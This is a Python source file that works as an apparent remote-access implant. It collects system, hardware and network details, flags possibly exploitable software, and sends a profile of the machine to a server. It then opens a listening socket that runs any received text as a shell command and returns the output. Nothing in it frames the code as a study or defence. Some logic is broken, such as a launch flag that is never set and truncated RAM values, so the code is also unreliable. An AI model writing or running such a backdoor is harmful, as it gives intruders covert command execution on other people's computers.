import subprocess
import platform as plat
import psutil
import uuid
import os
import socket
import time
# get the basic information of the software
report = open("report.txt", "w+")

id = open("id.txt", "a+")
if os.stat("id.txt").st_size == 0:
    id.write(str(uuid.uuid4()))
else:
    first_launch = False

platform = plat.platform()
system = plat.system()
ver = plat.release()
bits = plat.machine()
computer_name = plat.node()

report.write("Curplat: {} \n".format(platform))
report.write("Cursys: {} \n".format(system))
report.write("Curver: {} \n".format(ver))
report.write('Nmbrbits: {} \n'.format(bits))
report.write("CmpterName: {} \n \n".format(computer_name))

# get the basic informations of the hardware
cpu = plat.processor()

report.write("HARDWARE \n")

report.write("cores: {} \n".format(psutil.cpu_count(logical=False)))
report.write("totcore: {} \n".format(psutil.cpu_count(logical=True)))

totcore = psutil.cpu_count(logical=True)
# CPU frequencies
cpufreq = psutil.cpu_freq()
report.write(f"maxfreq: {cpufreq.max:.2f}Mhz \n")
report.write(f"minfreq: {cpufreq.min:.2f}Mhz \n")
maxfreq = cpufreq.max
minfreq = cpufreq.min
ram_in_o = str(psutil.virtual_memory()[0])

ram_in_MB = ram_in_o[0:2]
report.write("ramtot: {} \n \n".format(ram_in_MB))

report.write("NETWORK \n \n")

addrs = psutil.net_if_addrs()

for inter_name, inter_adres in addrs.items():
    for addrs in inter_adres:
        if str(addrs.family) == "AddressFamily.AF_INET":
            ip_addr = addrs.address
            report.write("IP Address: {} \n".format(addrs.address))
            report.write("Netmask: {} \n".format(addrs.netmask))
            report.write("Broadcast IP: {} \n".format(addrs.broadcast))
            broadcast_ip = addrs.broadcast
            netmask = addrs.netmask
        elif str(addrs.family) == "AddressFamily.AF_PACKET":
            mac_addr = addrs.address
            report.write("MAC Adress: {} \n".format(addrs.address))
            report.write("  Netmask: {} \n".format(addrs.netmask))
            report.write("  Broadcast MAC: {} \n \n".format(addrs.broadcast))
            BROADCAST_MAC = addrs.broadcast

report.write("ExplotableSoft \n \n")
if system == "Linux":
    try:
        apache = subprocess.Popen(["apache2"], stdout=subprocess.PIPE)
        report.write("Apache2")
    except:
        pass
report.close()
# sending the datas to the server


HOST = "127.0.0.1"
PORT = 5566
if first_launch:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        id_file = open("id.txt")
        id = id_file.read()
        req = cur = f"('{id}', '{computer_name}', '{ip_addr}', '{mac_addr}', '{platform}', '{system}', '{ver}', '{bits}', '{totcore}', '{maxfreq}', '{minfreq}', {ram_in_MB}, '{broadcast_ip}', '{netmask}', '{BROADCAST_MAC}');".encode()
        print(req)
        s.send(req)


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((ip_addr, 5566))
socket.listen(5)
client, address = socket.accept()
print("{} connected".format(address))
while True:

    sended = client.recv(255)

    cmd = sended.decode()
    if cmd == b'':
        time.sleep(10)
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, )

    stdout, stderr = process.communicate()
    if stderr is None:
        stderr = ""
    print(stdout, stderr)
    try:
        client.sendall(stdout)
    except:
        client.sendall(stderr)
    finally:
        client.sendall(str.encode("Command has returned any output"))

    pass
